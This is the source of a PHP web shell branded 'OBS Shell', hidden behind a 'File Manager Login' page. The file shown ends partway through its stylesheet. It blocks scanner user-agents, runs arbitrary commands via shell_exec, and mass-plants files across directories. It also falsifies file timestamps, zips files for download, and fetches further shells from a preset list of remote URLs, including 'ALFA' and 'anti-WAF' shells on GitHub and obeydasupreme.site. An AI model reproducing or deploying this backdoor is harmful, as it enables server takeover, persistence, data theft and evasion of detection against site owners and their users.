<?php
// ========== ANTI MALWARE / BADAI / MUTING BELIUNG / DLL ==========
$bad_bots = [
    'sqlmap','nikto','nmap','masscan','acunetix','netsparker',
    'havij','pangolin','whatweb','wpscan','dirbuster','gobuster',
    'hydra','medusa','metasploit','burpsuite','zap','paros',
    'morfeus','fimap','xsser','w3af','skipfish','arachni',
    'vega','grabber','ratproxy','wireshark','ettercap',
    'badai','mutingbeliung','putingbeliung','angin','tornado',
    'malware','virus','trojan','backdoor','rootkit','keylogger',
    'ransomware','worm','spyware','adware','phishing'
];
$ua_check = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
foreach ($bad_bots as $bot) {
    if (strpos($ua_check, $bot) !== false) {
        header('HTTP/1.1 403 Forbidden');
        die('🚫 Akses ditolak! Terdeteksi aktivitas berbahaya.');
    }
}
$bad_referers = ['semalt','buttons-for-website','social-buttons','kambasoft','savetube'];
$ref_check = strtolower($_SERVER['HTTP_REFERER'] ?? '');
foreach ($bad_referers as $bad) {
    if (strpos($ref_check, $bad) !== false) {
        header('HTTP/1.1 403 Forbidden');
        die('🚫 Referer tidak valid!');
    }
}
if (!in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST'])) {
    header('HTTP/1.1 405 Method Not Allowed');
    die('🚫 Method tidak diizinkan!');
}
// ========== END ANTI MALWARE ==========

error_reporting(E_ALL);
ini_set('display_errors', 1);

// ================== CONFIG ==================
$CONFIG_ROOT   = '/';
$PASSWORD_HASH = '$2a$12$YBwPvUB67MbvFaT9BfPBzOFVBSL0fYYWX97UCSpbODqDvnN6/mGB.';
$SESSION_KEY   = 'fm_auth';
// ============================================

session_start();
define('BASE_DIR', '/');

function cleanPath($path) {
    $path = trim($path);
    if ($path === '') $path = '/';
    if ($path[0] !== DIRECTORY_SEPARATOR) {
        $path = getcwd() . DIRECTORY_SEPARATOR . $path;
    }
    $real = realpath($path);
    if ($real === false) return getcwd();
    return $real;
}

// ======= AUTH (BCRYPT) =======
if (!isset($_SESSION[$SESSION_KEY]) || $_SESSION[$SESSION_KEY] !== true) {
    $error = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login_pass'])) {
        $pass = (string)($_POST['fm_login_pass']);
        if (password_verify($pass, $PASSWORD_HASH)) {
            $_SESSION[$SESSION_KEY] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah.";
        }
    }
    ?>
    <!doctype html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>File Manager Login</title>
    <link rel="icon" type="image/png" href="https://s15.gifyu.com/images/bQ0b1.png">
    <style>
     body {
       background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4-Ur1M0AF5_oQTYXjcC5MepAlGt3HKLc0QLHspmYQ7iTfln0SUtkSQak6AZ1-h_0yq6eOmbyfRRZJ1UMhUt8s_HQxjHqcULFe1ApCVRIOFWN8re-UBDV6yvGTR6uREN_MGGqBQnx-nKH5Sd1J-zbA_HOHhA1NW_o39Owk8Kbs213XOnxKdewVrk3R9Q/s736/kok.gif') no-repeat center center fixed;
       background-size: cover;
       color: #e9d5ff;
       font-family: system-ui, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
       margin: 0;
       cursor: default;
       position: relative;
     }
     body::before {
       content: '';
       position: fixed;
       inset: 0;
       background: radial-gradient(circle at center, rgba(60,10,110,0.75), rgba(10,2,25,0.95));
       z-index: 0;
       pointer-events: none;
     }
     .box {
       position: relative;
       z-index: 1;
       background: rgba(25,8,55,0.88);
       backdrop-filter: blur(14px);
       -webkit-backdrop-filter: blur(14px);
       padding: 30px 28px;
       border-radius: 16px;
       border: 1px solid rgba(168,85,247,0.5);
       box-shadow: 0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2);
       width: 340px;
       text-align: center;
       animation: boxGlow 3s ease-in-out infinite;
     }
     @keyframes boxGlow {
       0%,100% { box-shadow: 0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2); }
       50%     { box-shadow: 0 0 70px rgba(192,132,252,0.5), 0 0 140px rgba(168,85,247,0.3); }
     }
     .login-logo {
       width: 320px;
       height: auto;
       margin: 0 auto 15px;
       display: block;
       filter: drop-shadow(0 0 15px #a855f7) drop-shadow(0 0 30px #7c3aed);
       animation: floatLogo 3s ease-in-out infinite;
     }
     @keyframes floatLogo {
       0%,100% { transform: translateY(0) scale(1); }
       50%     { transform: translateY(-6px) scale(1.03); }
     }
     h3 {
       margin: 0 0 15px;
       font-size: 13px;
       text-transform: uppercase;
       letter-spacing: 0.12em;
       color: #c084fc;
       text-shadow: 0 0 10px #a855f7;
     }
     input[type=password] {
       width: 100%;
       padding: 10px 12px;
       border-radius: 6px;
       border: 1px solid rgba(168,85,247,0.5);
       background: rgba(15,5,35,0.9);
       color: #e9d5ff;
       font-size: 13px;
       box-sizing: border-box;
       outline: none;
       transition: border-color .2s, box-shadow .2s;
     }
     input[type=password]::placeholder { color: #a78bfa; opacity: 0.6; }
     input[type=password]:focus {
       border-color: #a855f7;
       box-shadow: 0 0 15px rgba(168,85,247,0.5);
     }
     button {
       margin-top: 12px;
       width: 100%;
       padding: 10px 12px;
       border-radius: 8px;
       border: none;
       background: linear-gradient(45deg, #a855f7, #7c3aed);
       color: #fff;
       font-size: 12px;
       font-weight: 600;
       letter-spacing: 1px;
       cursor: pointer;
       text-transform: uppercase;
       transition: opacity .2s, box-shadow .2s, transform .2s;
     }
     button:hover {
       opacity: .9;
       box-shadow: 0 0 20px rgba(168,85,247,0.7);
       transform: translateY(-2px);
     }
     .err {
       margin-top: 10px;
       font-size: 11px;
       color: #ff4d4d;
       text-align: center;
       min-height: 14px;
     }
    </style>
    </head>
    <body>
      <form method="post">
        <div class="box">
          <img src="https://s15.gifyu.com/images/bQjDP.png" alt="LOGO" class="login-logo">
          <h3>Protected Panel</h3>
          <input type="password" name="fm_login_pass" placeholder="Password"><br>
          <button type="submit">Enter</button>
          <div class="err"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
        </div>
      </form>
    </body>
    </html>
    <?php
    exit;
}

// ======= MAIN SETUP =======
$pwd         = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : getcwd();
$action      = isset($_POST['action']) ? $_POST['action'] : '';
$messages    = [];
$editFile    = isset($_GET['edit']) ? basename($_GET['edit']) : '';
$terminalOut = '';

$presets = [
    'ALFA ONI' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obs1.txt',
    'ALFA OBS' => 'https://obeydasupreme.site/shell/obs1.txt',
    'ALFA RUDY' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/papikeng.php',
    'ALFA ANTIWAF 1' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/alfashells.txt',
    'ALFA ANTIWAF 2' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/antibadai.txt',
    'ALFA ANTIWAF 3' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/antimalware.txt',
    'ALFA ANTIWAF 4' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/antiwaf.txt',
    'LOOSER' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/looser1.txt',
    'LOOSER 2' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/looser2.txt',
    'ZONE SHELL' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/1.php',
    'FMOBS' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/OBSNEWSHELLL.txt',
    'TINY' => 'https://obeydasupreme.site/shell/obstiny.txt',
    'GECKO' => 'https://obeydasupreme.site/shell/obsgecko.txt',
    'KOD EXPLORE' => 'https://github.com/kalcaddle/KODExplorer/archive/master.zip',
    'LADEV' => 'https://obeydasupreme.site/shell/okeoce.txt',
    'SCANNER' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/scannerfilter.txt',
    'ADMINER' => 'https://raw.githubusercontent.com/yourfr13nds/backburner/main/adminer.php',
    'GSC' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/google63c1b42f5347f5ee.html',
    'GSC 2' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/google29ba1fdf141689ea.html',
];

// ===== INFO SERVER PANEL =====
$uname = php_uname();
$userName  = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'n/a';
$groupName = function_exists('posix_getgrgid') ? (posix_getgrgid(posix_getegid())['name'] ?? 'unknown') : 'n/a';
$phpVersion = PHP_VERSION;
$serverIp = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$yourIp   = $_SERVER['REMOTE_ADDR'] ?? 'CLI';
$dateTime = date('Y-m-d H:i:s');
$diskTotal = @disk_total_space('/') ?: 0;
$diskFree  = @disk_free_space('/') ?: 0;
$diskTotalGB = $diskTotal ? round($diskTotal / 1024 / 1024 / 1024, 2) : 0;
$diskFreeGB  = $diskFree  ? round($diskFree  / 1024 / 1024 / 1024, 2) : 0;
$diskFreePct = $diskTotal ? round(($diskFree / $diskTotal) * 100) : 0;
$software = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
$curlOn  = function_exists('curl_version') ? 'ON' : 'OFF';
$ssh2On  = function_exists('ssh2_connect') ? 'ON' : 'OFF';
$mysqlOn = function_exists('mysqli_connect') ? 'ON' : 'OFF';
$pgOn    = function_exists('pg_connect') ? 'ON' : 'OFF';

// ======= HELPERS =======
function chmod_recursive($path, $mode, &$messages) {
    if (!file_exists($path)) { $messages[] = "[FAIL] Target tidak ada (rekursif): $path"; return; }
    if (!@chmod($path, $mode)) { $messages[] = "[FAIL] Gagal chmod: $path"; }
    else { $messages[] = "[OK]   Berhasil chmod: $path"; }
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items === false) return;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $child = $path . DIRECTORY_SEPARATOR . $it;
            chmod_recursive($child, $mode, $messages);
        }
    }
}
function touch_recursive($path, $ts, &$messages, $labelTime) {
    if (!file_exists($path)) { $messages[] = "[FAIL] Target tidak ada (rekursif): $path"; return; }
    if (!@touch($path, $ts)) { $messages[] = "[FAIL] Gagal set waktu: $path ke $labelTime"; }
    else { clearstatcache(true, $path); $messages[] = "[OK]   Berhasil set waktu: $path ke $labelTime"; }
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items === false) return;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $child = $path . DIRECTORY_SEPARATOR . $it;
            touch_recursive($child, $ts, $messages, $labelTime);
        }
    }
}
function create_in_dirs_recursive($baseDirs, $name, $isFile, $content, &$messages) {
    foreach ($baseDirs as $dirPath) {
        $dirPath = cleanPath($dirPath);
        if (!is_dir($dirPath)) { $messages[] = "[FAIL] Dir target tidak ada: $dirPath"; continue; }
        $stack = [$dirPath];
        while ($stack) {
            $cur = array_pop($stack);
            if (!is_dir($cur)) continue;
            $dest = rtrim($cur, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
            if ($isFile) {
                if (file_exists($dest)) { $messages[] = "[SKIP] File sudah ada: $dest"; }
                else { if (file_put_contents($dest, $content) === false) { $messages[] = "[FAIL] Gagal buat file: $dest"; } else { $messages[] = "[OK]   File dibuat: $dest"; } }
            } else {
                if (is_dir($dest) || file_exists($dest)) { $messages[] = "[SKIP] Folder/file sudah ada: $dest"; }
                else { if (!@mkdir($dest, 0775, false)) { $messages[] = "[FAIL] Gagal buat folder: $dest"; } else { $messages[] = "[OK]   Folder dibuat: $dest"; } }
            }
            $items = @scandir($cur);
            if ($items === false) continue;
            foreach ($items as $it) {
                if ($it === '.' || $it === '..') continue;
                $child = $cur . DIRECTORY_SEPARATOR . $it;
                if (is_dir($child)) $stack[] = $child;
            }
        }
    }
}
function destroy_dir($dir) {
    if (!is_dir($dir) || is_link($dir)) return @unlink($dir);
    foreach (scandir($dir) as $file) {
        if ($file == '.' || $file == '..') continue;
        if (!destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) {
            @chmod($dir . DIRECTORY_SEPARATOR . $file, 0777);
            if (!destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) return false;
        }
    }
    return @rmdir($dir);
}
function zip_paths($paths, $zipFile, &$messages) {
    if (!class_exists('ZipArchive')) { $messages[] = "[FAIL] ZipArchive tidak tersedia di server."; return false; }
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) { $messages[] = "[FAIL] Tidak bisa membuat ZIP: $zipFile"; return false; }
    foreach ($paths as $p) {
        if (is_dir($p)) {
            $base = basename($p);
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($it as $file) {
                $relPath = $base . '/' . substr($file->getPathname(), strlen($p) + 1);
                if ($file->isDir()) $zip->addEmptyDir($relPath);
                else $zip->addFile($file->getPathname(), $relPath);
            }
        } elseif (is_file($p)) { $zip->addFile($p, basename($p)); }
    }
    $zip->close();
    return true;
}
function send_download($path, $downloadName = null) {
    if (!file_exists($path)) return false;
    if ($downloadName === null) $downloadName = basename($path);
    if (ob_get_length()) @ob_end_clean();
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $downloadName . '"');
    header('Content-Length: ' . filesize($path));
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    readfile($path);
    return true;
}

// ================== HANDLE POST ==================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pwd    = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : getcwd();
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    if ($action === 'terminal_exec') {
        $cmd = isset($_POST['terminal_cmd']) ? trim($_POST['terminal_cmd']) : '';
        if ($cmd === '') { $messages[] = "Perintah terminal kosong."; }
        else {
            $fullCmd = 'cd ' . escapeshellarg($pwd) . ' && ' . $cmd . ' 2>&1';
            $output  = @shell_exec($fullCmd);
            if ($output === null) { $messages[] = "[FAIL] shell_exec diblokir di server."; }
            else { $terminalOut = $output; }
        }
    } else {
        if ($action === 'create_file_flat') {
            $rawName = $_POST['new_file_name'] ?? '';
            $name    = basename(trim($rawName));
            $content = $_POST['new_file_content'] ?? '';
            if ($name === '') { $messages[] = "Nama file baru wajib diisi."; }
            else {
                $dirs = $_POST['dir_targets'] ?? [];
                if ($dirs) {
                    foreach ($dirs as $dirPath) {
                        $dirPath = cleanPath($dirPath);
                        if (!is_dir($dirPath)) { $messages[] = "[FAIL] Dir target tidak ada: $dirPath"; continue; }
                        $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
                        if (file_exists($dest)) { $messages[] = "[FAIL] File sudah ada: $dest"; continue; }
                        if (file_put_contents($dest, $content) === false) { $messages[] = "[FAIL] Gagal membuat file di $dest"; }
                        else { $messages[] = "[OK]   Berhasil membuat file di $dest"; }
                    }
                } else {
                    $dest = $pwd . DIRECTORY_SEPARATOR . $name;
                    if (file_exists($dest)) { $messages[] = "[FAIL] File sudah ada: $dest"; }
                    else { if (file_put_contents($dest, $content) === false) { $messages[] = "[FAIL] Gagal membuat file: $dest"; } else { $messages[] = "[OK]   Berhasil membuat file: $dest"; } }
                }
            }
        }
        if ($action === 'create_file_recursive') {
            $rawName = $_POST['new_file_name'] ?? '';
            $name    = basename(trim($rawName));
            $content = $_POST['new_file_content'] ?? '';
            $dirs    = $_POST['dir_targets'] ?? [];
            if ($name === '') { $messages[] = "Nama file baru wajib diisi."; }
            elseif (!$dirs) { $messages[] = "Centang minimal satu folder untuk create file recursive."; }
            else { create_in_dirs_recursive($dirs, $name, true, $content, $messages); }
        }
        if ($action === 'create_folder_flat') {
            $rawName = $_POST['new_folder_name'] ?? '';
            $name    = basename(trim($rawName));
            if ($name === '') { $messages[] = "Nama folder baru wajib diisi."; }
            else {
                $dirs = $_POST['dir_targets'] ?? [];
                if ($dirs) {
                    foreach ($dirs as $dirPath) {
                        $dirPath = cleanPath($dirPath);
                        if (!is_dir($dirPath)) { $messages[] = "[FAIL] Dir target tidak ada: $dirPath"; continue; }
                        $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
                        if (is_dir($dest) || file_exists($dest)) { $messages[] = "[FAIL] Folder/file sudah ada: $dest"; continue; }
                        if (!@mkdir($dest, 0775, false)) { $messages[] = "[FAIL] Gagal membuat folder: $dest"; }
                        else { $messages[] = "[OK]   Berhasil membuat folder: $dest"; }
                    }
                } else {
                    $dest = $pwd . DIRECTORY_SEPARATOR . $name;
                    if (is_dir($dest) || file_exists($dest)) { $messages[] = "[FAIL] Folder/file sudah ada: $dest"; }
                    else { if (!@mkdir($dest, 0775, false)) { $messages[] = "[FAIL] Gagal membuat folder: $dest"; } else { $messages[] = "[OK]   Berhasil membuat folder: $dest"; } }
                }
            }
        }
        if ($action === 'create_folder_recursive') {
            $rawName = $_POST['new_folder_name'] ?? '';
            $name    = basename(trim($rawName));
            $dirs    = $_POST['dir_targets'] ?? [];
            if ($name === '') { $messages[] = "Nama folder baru wajib diisi."; }
            elseif (!$dirs) { $messages[] = "Centang minimal satu folder untuk create folder recursive."; }
            else { create_in_dirs_recursive($dirs, $name, false, '', $messages); }
        }
        if ($action === 'rename_save_mass') {
            $fileTargets = $_POST['file_targets'] ?? [];
            $renameVals  = $_POST['rename_val'] ?? [];
            if (!$fileTargets) { $messages[] = "Pilih minimal satu file untuk rename."; }
            else {
                foreach ($fileTargets as $oldRaw) {
                    $old = basename($oldRaw);
                    $new = isset($renameVals[$old]) ? trim($renameVals[$old]) : '';
                    if ($new=== '') { $messages[] = "Nama baru kosong untuk $old."; continue; }
                    $from = $pwd . DIRECTORY_SEPARATOR . $old;
                    if (!is_file($from)) { $messages[] = "[FAIL] File tidak ada: $from"; continue; }
                    $to = $pwd . DIRECTORY_SEPARATOR . basename($new);
                    if (!@rename($from, $to)) { $messages[] = "[FAIL] Gagal rename $from -> $to"; }
                    else { $messages[] = "[OK]   Berhasil rename $from -> $to"; }
                }
            }
        }
        if (strpos($action, 'delete_one:') === 0) {
            $name = basename(substr($action, strlen('delete_one:')));
            $path = $pwd . DIRECTORY_SEPARATOR . $name;
            if (!is_file($path)) { $messages[] = "[FAIL] File tidak ada: $path"; }
            elseif (!@unlink($path)) { $messages[] = "[FAIL] Gagal hapus file: $path"; }
            else { $messages[] = "[OK]   Berhasil hapus file: $path"; }
        }
        if (strpos($action, 'delete_dir_one:') === 0) {
            $dirPath = substr($action, strlen('delete_dir_one:'));
            $dirPath = cleanPath($dirPath);
            if (!is_dir($dirPath)) { $messages[] = "[FAIL] Folder tidak ada: $dirPath"; }
            else { if (!destroy_dir($dirPath)) { $messages[] = "[FAIL] Gagal hapus folder: $dirPath"; } else { $messages[] = "[OK]   Berhasil hapus folder: $dirPath"; } }
        }
        if (strpos($action, 'rename_dir_one:') === 0) {
            $payload = substr($action, strlen('rename_dir_one:'));
            $parts   = explode('|', $payload, 2);
            if (count($parts) !== 2) { $messages[] = "[FAIL] Data rename folder tidak valid."; }
            else {
                $oldPath = cleanPath($parts[0]);
                $newName = trim($parts[1]);
                if ($newName === '') { $messages[] = "[FAIL] Nama folder baru kosong."; }
                elseif (!is_dir($oldPath)) { $messages[] = "[FAIL] Folder tidak ada: $oldPath"; }
                else {
                    $parentDir = dirname($oldPath);
                    $newPath   = $parentDir . DIRECTORY_SEPARATOR . basename($newName);
                    if (file_exists($newPath)) { $messages[] = "[FAIL] Target sudah ada: $newPath"; }
                    elseif (!@rename($oldPath, $newPath)) { $messages[] = "[FAIL] Gagal rename folder: $oldPath -> $newPath"; }
                    else { $messages[] = "[OK]   Berhasil rename folder: $oldPath -> $newPath"; }
                }
            }
        }
        if ($action === 'edit_save') {
            $fileName = basename($_POST['edit_file'] ?? '');
            $content  = $_POST['file_content'] ?? '';
            if ($fileName === '') { $messages[] = "Nama file untuk edit kosong."; }
            else {
                $path = $pwd . DIRECTORY_SEPARATOR . $fileName;
                if (!is_file($path)) { $messages[] = "[FAIL] File tidak ada: $path"; }
                elseif (!is_writable($path)) { $messages[] = "[FAIL] File tidak bisa ditulis: $path"; }
                elseif (file_put_contents($path, $content) === false) { $messages[] = "[FAIL] Gagal menyimpan isi file: $path"; }
                else { $messages[] = "[OK]   Berhasil menyimpan file: $path"; }
            }
        }
        if ($action === 'deploy_url') {
            $url        = trim($_POST['src_url'] ?? '');
            $rawTarget  = $_POST['target_name_url'] ?? '';
            $targetName = basename(trim($rawTarget));
            if ($url === '' || $targetName === '') { $messages[] = "URL dan nama file tujuan wajib diisi."; }
            elseif (!preg_match('#^https?://#i', $url)) { $messages[] = "URL harus dimulai dengan http:// atau https://"; }
            else {
                $data = @file_get_contents($url);
                if ($data === false) { $messages[] = "Gagal download dari URL."; }
                else {
                    $dirs = $_POST['dir_targets'] ?? [];
                    if ($dirs) {
                        foreach ($dirs as $dirPath) {
                            $dirPath = cleanPath($dirPath);
                            if (!is_dir($dirPath)) { $messages[] = "[FAIL] Dir target tidak ada: $dirPath"; continue; }
                            $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $targetName;
                            if (file_put_contents($dest, $data) === false) { $messages[] = "[FAIL] Gagal simpan ke $dest"; }
                            else { $messages[] = "[OK]   Berhasil download ke $dest"; }
                        }
                    } else {
                        $dest = $pwd . DIRECTORY_SEPARATOR . $targetName;
                        if (is_dir($dest)) { $messages[] = "[FAIL] Tujuan adalah direktori, bukan file: $dest"; }
                        elseif (file_put_contents($dest, $data) === false) { $messages[] = "[FAIL] Gagal simpan ke $dest"; }
                        else { $messages[] = "[OK]   Berhasil download ke $dest"; }
                    }
                }
            }
        }
        if ($action === 'deploy_upload') {
            $rawTarget  = $_POST['target_name_upload'] ?? '';
            $targetName = basename(trim($rawTarget));
            if (!isset($_FILES['src_file']) || $_FILES['src_file']['error'] !== UPLOAD_ERR_OK) { $messages[] = "Upload gagal atau tidak ada file."; }
            elseif ($targetName === '') { $messages[] = "Nama file tujuan wajib diisi."; }
            else {
                $tmp  = $_FILES['src_file']['tmp_name'];
                $dirs = $_POST['dir_targets'] ?? [];
                if ($dirs) {
                    foreach ($dirs as $dirPath) {
                        $dirPath = cleanPath($dirPath);
                        if (!is_dir($dirPath)) { $messages[] = "[FAIL] Dir target tidak ada: $dirPath"; continue; }
                        $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $targetName;
                        if (!@copy($tmp, $dest)) { $messages[] = "[FAIL] Gagal copy upload ke $dest"; }
                        else { $messages[] = "[OK]   Berhasil upload ke $dest"; }
                    }
                } else {
                    $dest = $pwd . DIRECTORY_SEPARATOR . $targetName;
                    if (is_dir($dest)) { $messages[] = "[FAIL] Tujuan adalah direktori, bukan file: $dest"; }
                    else {
                        if (!@move_uploaded_file($tmp, $dest)) {
                            if (!@copy($tmp, $dest)) { $messages[] = "[FAIL] Gagal simpan upload ke $dest"; }
                            else { $messages[] = "[OK]   Berhasil upload ke $dest (via copy)"; }
                        } else { $messages[] = "[OK]   Berhasil uploadke $dest"; }
                    }
                }
            }
        }
        if ($action === 'chmod_apply_flat') {
            $fileTargets = $_POST['file_targets'] ?? [];
            $dirTargets  = $_POST['dir_targets']  ?? [];
            $modeStr     = trim($_POST['chmod_mode'] ?? '');
            if ((!$fileTargets && !$dirTargets) || $modeStr === '') { $messages[] = "Pilih file/dir dan isi mode chmod."; }
            else {
                $mode = octdec($modeStr);
                foreach ($fileTargets as $t) {
                    $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
                    if (!file_exists($f)) { $messages[] = "[FAIL] Target file tidak ada: $f"; continue; }
                    if (!@chmod($f, $mode)) { $messages[] = "[FAIL] Gagal chmod file: $f"; }
                    else { $messages[] = "[OK]   Berhasil chmod file: $f"; }
                }
                foreach ($dirTargets as $d) {
                    $dirPath = cleanPath($d);
                    if (!file_exists($dirPath)) { $messages[] = "[FAIL] Target dir tidak ada: $dirPath"; continue; }
                    if (!@chmod($dirPath, $mode)) { $messages[] = "[FAIL] Gagal chmod dir: $dirPath"; }
                    else { $messages[] = "[OK]   Berhasil chmod dir: $dirPath"; }
                }
            }
        }
        if ($action === 'chmod_apply_recursive') {
            $fileTargets = $_POST['file_targets'] ?? [];
            $dirTargets  = $_POST['dir_targets']  ?? [];
            $modeStr     = trim($_POST['chmod_mode'] ?? '');
            if ((!$fileTargets && !$dirTargets) || $modeStr === '') { $messages[] = "Pilih file/dir dan isi mode chmod."; }
            else {
                $mode = octdec($modeStr);
                foreach ($fileTargets as $t) {
                    $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
                    chmod_recursive($f, $mode, $messages);
                }
                foreach ($dirTargets as $d) {
                    $dirPath = cleanPath($d);
                    chmod_recursive($dirPath, $mode, $messages);
                }
            }
        }
        if ($action === 'time_apply_flat') {
            $fileTargets = $_POST['file_targets'] ?? [];
            $dirTargets  = $_POST['dir_targets']  ?? [];
            $timeStr     = trim($_POST['time_value'] ?? '');
            if ((!$fileTargets && !$dirTargets) || $timeStr === '') { $messages[] = "Pilih file/dir dan isi waktu."; }
            else {
                $ts = strtotime($timeStr);
                if ($ts === false) { $messages[] = "Format waktu tidak valid."; }
                else {
                    foreach ($fileTargets as $t) {
                        $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
                        if (!file_exists($f)) { $messages[] = "[FAIL] Target tidak ada: $f"; continue; }
                        if (!@touch($f, $ts)) { $messages[] = "[FAIL] Gagal set waktu: $f"; }
                        else { clearstatcache(true, $f); $messages[] = "[OK]   Berhasil set waktu: $f"; }
                    }
                    foreach ($dirTargets as $d) {
                        $dirPath = cleanPath($d);
                        if (!file_exists($dirPath)) { $messages[] = "[FAIL] Target tidak ada: $dirPath"; continue; }
                        if (!@touch($dirPath, $ts)) { $messages[] = "[FAIL] Gagal set waktu: $dirPath"; }
                        else { clearstatcache(true, $dirPath); $messages[] = "[OK]   Berhasil set waktu: $dirPath"; }
                    }
                }
            }
        }
        if ($action === 'time_apply_recursive') {
            $fileTargets = $_POST['file_targets'] ?? [];
            $dirTargets  = $_POST['dir_targets']  ?? [];
            $timeStr     = trim($_POST['time_value'] ?? '');
            if ((!$fileTargets && !$dirTargets) || $timeStr === '') { $messages[] = "Pilih file/dir dan isi waktu."; }
            else {
                $ts = strtotime($timeStr);
                if ($ts === false) { $messages[] = "Format waktu tidak valid."; }
                else {
                    foreach ($fileTargets as $t) {
                        $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
                        touch_recursive($f, $ts, $messages, $timeStr);
                    }
                    foreach ($dirTargets as $d) {
                        $dirPath = cleanPath($d);
                        touch_recursive($dirPath, $ts, $messages, $timeStr);
                    }
                }
            }
        }
        if ($action === 'download_selected') {
            $fileTargets = $_POST['file_targets'] ?? [];
            $dirTargets  = $_POST['dir_targets']  ?? [];
            if (!$fileTargets && !$dirTargets) { $messages[] = "Pilih minimal satu file atau folder untuk download."; }
            else {
                $paths = [];
                foreach ($fileTargets as $f) {
                    $p = $pwd . DIRECTORY_SEPARATOR . basename($f);
                    if (file_exists($p)) $paths[] = $p;
                }
                foreach ($dirTargets as $d) {
                    $p = cleanPath($d);
                    if (is_dir($p)) $paths[] = $p;
                }
                if (!$paths) { $messages[] = "Tidak ada target valid untuk di-zip."; }
                else {
                    $zipName = 'download_' . date('Ymd_His') . '.zip';
                    $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
                    if (!zip_paths($paths, $zipPath, $messages)) { $messages[] = "Gagal membuat ZIP download."; }
                    else {
                        if (send_download($zipPath, $zipName)) { @unlink($zipPath); exit; }
                        else { $messages[] = "Gagal mengirim file download."; }
                    }
                }
            }
        }
    }
}

$editContent = '';
if ($editFile !== '') {
    $editPath = $pwd . DIRECTORY_SEPARATOR . $editFile;
    if (is_file($editPath) && is_readable($editPath)) { $editContent = file_get_contents($editPath); }
    else { $messages[] = "[FAIL] Tidak bisa membaca file: $editPath"; $editFile = ''; }
}

$self   = htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8');
$parent = dirname($pwd);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>OBS Shell</title>
<link rel="icon" type="image/png" href="https://s15.gifyu.com/images/bQ0b1.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
 :root {
   --bg: #0a0219;
   --border: #2d1050;
   --border2: #4c1d95;
   --accent: #a855f7;
   --accent-soft: rgba(168,85,247,0.15);
   --accent-strong: #7c3aed;
   --accent2: #c084fc;
   --text: #e9d5ff;
   --text-soft: #a78bfa;
   --danger: #ff4d4d;
   --row-hover: rgba(168,85,247,0.12);
   --row-selected: rgba(168,85,247,0.2);
   --input-bg: rgba(15,5,35,0.9);
 }
 * { box-sizing:border-box; }
 body{
   margin:0;
   padding:16px;
   font-family:"Inter",system-ui,-apple-system,BlinkMacSystemFont,sans-serif;
   font-size:13px;
